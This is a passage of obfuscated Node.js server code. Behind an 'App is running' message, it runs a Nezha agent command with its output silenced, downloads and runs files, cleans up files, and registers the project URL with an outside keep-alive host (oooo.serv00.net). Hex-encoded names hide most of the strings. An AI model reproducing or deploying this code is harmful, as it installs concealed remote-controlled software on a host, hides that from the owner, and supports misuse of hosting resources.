NEZHA_SERVER&&NEZHA_KEY&&_0x5d4e70[_0x37c5a4(0x23a)](phpPath);process['platform']===_0x37c5a4(0x285)?exec(_0x37c5a4(0x249)+_0x5d4e70[_0x37c5a4(0x202)]('\x20')+_0x37c5a4(0x295),_0x447796=>{const _0x278be0=_0x37c5a4;console[_0x278be0(0x20b)](),console[_0x278be0(0x234)](_0x278be0(0x1e7)),console[_0x278be0(0x234)](_0x278be0(0x243));}):exec(_0x37c5a4(0x286)+_0x5d4e70[_0x37c5a4(0x202)]('\x20')+'\x20>/dev/null\x202>&1',_0x1a301f=>{const _0x5c9cb1=_0x37c5a4;console[_0x5c9cb1(0x20b)](),console[_0x5c9cb1(0x234)]('App\x20is\x20running'),console['log'](_0x5c9cb1(0x243));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x1de3b3=_0x56ee8b;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x1de3b3(0x234)](_0x1de3b3(0x2a3));return;}try{const _0x3c00d7=await axios[_0x1de3b3(0x281)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x1de3b3(0x242)}});return console[_0x1de3b3(0x234)](_0x1de3b3(0x235)),_0x3c00d7;}catch(_0x1413d7){return console[_0x1de3b3(0x257)](_0x1de3b3(0x26a)+_0x1413d7[_0x1de3b3(0x280)]),null;}}async function startserver(){const _0x48783f=_0x56ee8b;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x4d40ce){console['error'](_0x48783f(0x20f),_0x4d40ce);}}startserver()[_0x56ee8b(0x27b)](_0x4cc368=>{const _0x283655=_0x56ee8b;console[_0x283655(0x257)]('Unhandled\x20error\x20in\x20startserver:',_0x4cc368);}),app['listen'](PORT,()=>console['log'](_0x56ee8b(0x220)+PORT+'!'));
